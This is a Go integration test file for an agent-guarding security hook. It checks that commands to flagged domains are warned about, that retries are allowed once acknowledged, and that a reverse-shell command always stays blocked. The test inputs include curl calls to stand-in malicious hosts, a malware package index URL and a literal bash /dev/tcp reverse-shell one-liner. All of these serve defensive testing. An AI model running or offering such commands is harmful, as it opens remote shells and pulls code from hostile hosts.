// Tests for Config.ModeWarn: a flagged domain-reputation deny warns
// (deny + audited message) on the first touch, and the SAME action
// retried (Cursor's "Try Again" re-fires beforeShellExecution) is
// acknowledged and allowed, remembered for a window scoped per
// TRUSTGATE_OVERRIDE_SCOPE. Unlike the removed prompt/ask UX, this
// needs no after-hooks: the whole flow lives in the before-hook.
package integration

import (
	"os"
	"strings"
	"testing"
)

func warnEnv(t *testing.T) (cacheDir string, env []string) {
	t.Helper()
	cacheDir, _, env = hookEnv(t)
	// hookEnv pins enforce; replace it with warn (setEnv removes the prior
	// TRUSTGATE_MODE so the child doesn't see two of them).
	env = setEnv(env, "TRUSTGATE_MODE", "warn")
	// Disable the acknowledgment dwell gate for the promote-on-retry
	// tests below: they do an instantaneous in-process retry, which the
	// (nonzero) default dwell would otherwise reject as "too soon". The
	// dwell gate has its own dedicated test (TestShell_Warn_DwellGate_*)
	// that sets it explicitly.
	env = append(env, "TRUSTGATE_WARN_ACK_MIN_SECONDS=0")
	return cacheDir, env
}

func TestShell_Warn_FirstTouch_DeniesWithAuditedMessage(t *testing.T) {
	cacheDir, env := warnEnv(t)
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)
	out, _ := runHook(t, env, "trustgate-before-shell",
		`{"command":"curl https://malicious.example/x"}`)
	if got := out["permission"]; got != "deny" {
		t.Fatalf("warn/first-touch: permission = %v, want deny; full: %v", got, out)
	}
	msg, _ := out["user_message"].(string)
	if !strings.Contains(msg, "malicious.example") {
		t.Errorf("warn/first-touch: user_message missing domain: %v", out)
	}
	if !strings.Contains(msg, "Audited") {
		t.Errorf("warn/first-touch: expected the audited-retry message, got: %v", msg)
	}
	if strings.Contains(msg, "trustgate override") {
		t.Errorf("warn/first-touch: did not expect the CLI override hint under warn mode, got: %v", msg)
	}
}

func TestShell_Warn_Retry_IsAcknowledgedAndAllowed(t *testing.T) {
	cacheDir, env := warnEnv(t)
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)

	first, _ := runHook(t, env, "trustgate-before-shell",
		`{"command":"curl https://malicious.example/x"}`)
	if first["permission"] != "deny" {
		t.Fatalf("expected first touch to deny, got: %v", first)
	}

	// Retry: the identical action, re-fired (what Cursor's "Try Again"
	// does on a blocked command).
	retry, _ := runHook(t, env, "trustgate-before-shell",
		`{"command":"curl https://malicious.example/x"}`)
	if got := retry["permission"]; got != "allow" {
		t.Errorf("warn/retry: permission = %v, want allow (acknowledged); full: %v", got, retry)
	}
}

func TestShell_Warn_WithinWindow_SubsequentTouchesAreSilentlyAllowed(t *testing.T) {
	cacheDir, env := warnEnv(t)
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)

	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // warn
	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // retry -> grant

	third, _ := runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`)
	if got := third["permission"]; got != "allow" {
		t.Errorf("warn/within-window: permission = %v, want allow; full: %v", got, third)
	}
}

func TestShell_Warn_DomainScope_UnrelatedHostStillWarns(t *testing.T) {
	cacheDir, env := warnEnv(t)
	env = append(env, "TRUSTGATE_OVERRIDE_SCOPE=domain")
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)
	seedCache(t, cacheDir, "other-bad.example", "Malicious", 0.99)

	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // warn
	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // retry -> grant for malicious.example only

	other, _ := runHook(t, env, "trustgate-before-shell", `{"command":"curl https://other-bad.example/x"}`)
	if got := other["permission"]; got != "deny" {
		t.Errorf("warn/domain-scope: expected an unrelated host to still warn, got permission = %v; full: %v", got, other)
	}
}

func TestShell_Warn_TimeScope_RetryGrantsBlanketWindow(t *testing.T) {
	cacheDir, env := warnEnv(t)
	env = append(env, "TRUSTGATE_OVERRIDE_SCOPE=time")
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)
	seedCache(t, cacheDir, "other-bad.example", "Malicious", 0.99)

	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // warn
	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // retry -> blanket grant

	other, _ := runHook(t, env, "trustgate-before-shell", `{"command":"curl https://other-bad.example/x"}`)
	if got := other["permission"]; got != "allow" {
		t.Errorf("warn/time-scope: expected a blanket window to cover an unrelated host too, got permission = %v; full: %v", got, other)
	}
}

func TestMCP_Warn_FirstTouchThenRetry(t *testing.T) {
	cacheDir, env := warnEnv(t)
	// Use flagged.example (not the usual malicious.example placeholder) so
	// the reputation cascade — not ATR's exfil-URL rule — drives this
	// warn-mode test: ATR-2026-00095 matches a fetch/curl tool_response
	// sitting within 30 chars of the literal keyword "malicious", which
	// would hard-deny on every call and defeat the warn/retry assertion.
	seedCache(t, cacheDir, "flagged.example", "Malicious", 0.99)

	first, _ := runHook(t, env, "trustgate-before-mcp",
		`{"tool":"fetch","arguments":{"url":"https://flagged.example/api"}}`)
	if first["permission"] != "deny" {
		t.Fatalf("expected first touch to deny, got: %v", first)
	}
	retry, _ := runHook(t, env, "trustgate-before-mcp",
		`{"tool":"fetch","arguments":{"url":"https://flagged.example/api"}}`)
	if got := retry["permission"]; got != "allow" {
		t.Errorf("mcp warn/retry: permission = %v, want allow; full: %v", got, retry)
	}
}

func TestReadFile_Warn_NoRetryMechanism_AlwaysHardDenies(t *testing.T) {
	// beforeReadFile has no "Try Again"-style re-invocation semantics
	// in this test harness's control (each call is independent), but
	// more importantly: warn mode's audited-message deny is still the
	// correct behavior here regardless — this asserts the message
	// shape stays consistent across surfaces.
	cacheDir, env := warnEnv(t)
	seedCache(t, cacheDir, "malware.example", "Malicious", 0.99)
	out, _ := runHook(t, env, "trustgate-before-read-file",
		`{"path":"/tmp/requirements.txt","content":"--index-url https://malware.example/simple\nfoo==1.0\n"}`)
	if got := out["permission"]; got != "deny" {
		t.Errorf("readfile warn: permission = %v, want deny; full: %v", got, out)
	}
	msg, _ := out["user_message"].(string)
	if !strings.Contains(msg, "Audited") {
		t.Errorf("readfile warn: expected the audited-retry message, got: %v", msg)
	}
}

func TestShell_Warn_ATRDenyIsNeverLiftedByRetry(t *testing.T) {
	// ATR (behavioral detection) runs AFTER finalizeDecision in
	// hookrunner.applyATR, so an ATR-triggered deny never sets
	// Decision.Warned and is never eligible for the deny-once-then-
	// allow-on-retry treatment — it stays a hard, non-negotiable
	// block regardless of Mode or how many times the identical action
	// is retried. TRUSTGATE-SHELL-006 (reverse shell) fires here.
	_, env := warnEnv(t)
	cmd := `{"command":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}`

	first, _ := runHook(t, env, "trustgate-before-shell", cmd)
	if got := first["permission"]; got != "deny" {
		t.Fatalf("expected ATR to deny under warn mode, got permission = %v; full: %v", got, first)
	}
	if msg, _ := first["user_message"].(string); strings.Contains(msg, "Audited") {
		t.Errorf("expected an ATR deny to NOT carry the warn-mode audited message, got: %q", msg)
	}

	retry, _ := runHook(t, env, "trustgate-before-shell", cmd)
	if got := retry["permission"]; got != "deny" {
		t.Errorf("expected the retry to ALSO deny (ATR is never lifted by a retry), got permission = %v; full: %v", got, retry)
	}
}

func TestShell_Warn_DwellGate_ImmediateRetryReWarnsThenAgentMessageSaysStop(t *testing.T) {
	// With a large dwell, an immediate (agent-speed) retry must NOT be
	// acknowledged — it re-warns instead of being allowed. This is the
	// defense against the agent auto-retrying the audited-retry message on
	// the user's behalf before a human has acted. Build the env directly
	// (not via warnEnv, which disables the gate) to avoid a duplicate
	// TRUSTGATE_WARN_ACK_MIN_SECONDS key.
	cacheDir, _, env := hookEnv(t)
	env = setEnv(env, "TRUSTGATE_MODE", "warn")
	env = append(env, "TRUSTGATE_WARN_ACK_MIN_SECONDS=3600")
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)

	first, _ := runHook(t, env, "trustgate-before-shell",
		`{"command":"curl https://malicious.example/x"}`)
	if first["permission"] != "deny" {
		t.Fatalf("expected first touch to deny, got: %v", first)
	}
	// The agent-facing message must tell the agent to stop, not retry.
	if agentMsg, _ := first["agent_message"].(string); !strings.Contains(strings.ToLower(agentMsg), "do not retry") {
		t.Errorf("expected agent_message to tell the agent not to retry, got: %q", agentMsg)
	}
	if agentMsg, _ := first["agent_message"].(string); strings.Contains(strings.ToLower(agentMsg), "re-run") {
		t.Errorf("expected agent_message to NOT instruct a re-run, got: %q", agentMsg)
	}
	// The human-facing message keeps the retry guidance.
	if userMsg, _ := first["user_message"].(string); !strings.Contains(userMsg, "re-run the same action") {
		t.Errorf("expected user_message to keep the human retry guidance, got: %q", userMsg)
	}

	// Immediate retry (inside the dwell): must re-warn, not allow.
	retry, _ := runHook(t, env, "trustgate-before-shell",
		`{"command":"curl https://malicious.example/x"}`)
	if got := retry["permission"]; got != "deny" {
		t.Errorf("warn/dwell: expected an inside-dwell retry to re-warn (deny), got permission = %v; full: %v", got, retry)
	}
}

// Note: warn mode failing OPEN on a provider error (vs enforce failing
// closed) is covered deterministically by the unit test
// TestCompose_ProviderError_WarnModeFailsOpenEvenWhenFailClosed in
// internal/verdict — it uses a fake provider that returns an error, so it
// doesn't depend on live-network behavior. An integration test can't force
// a real provider error hermetically (the harness seeds the cache exactly
// to avoid the network, and reserved-TLD domains resolve to UNKNOWN without
// a lookup), so it's intentionally not duplicated at the subprocess level.

func TestDoctor_ShowsWarnModeAndActiveGrants(t *testing.T) {
	cacheDir, env := warnEnv(t)
	seedCache(t, cacheDir, "malicious.example", "Malicious", 0.99)
	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // warn
	runHook(t, env, "trustgate-before-shell", `{"command":"curl https://malicious.example/x"}`) // retry -> grant

	// decisions.log must have recorded every step (audit requirement
	// holds regardless of who/what triggered the retry).
	logPath := ""
	for _, kv := range env {
		if strings.HasPrefix(kv, "TRUSTGATE_LOG_PATH=") {
			logPath = strings.TrimPrefix(kv, "TRUSTGATE_LOG_PATH=")
		}
	}
	if logPath == "" {
		t.Fatal("TRUSTGATE_LOG_PATH not found in env")
	}
	data, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("read decision log: %v", err)
	}
	if !strings.Contains(string(data), "malicious.example") {
		t.Errorf("expected the decision log to mention malicious.example, got:\n%s", data)
	}
}
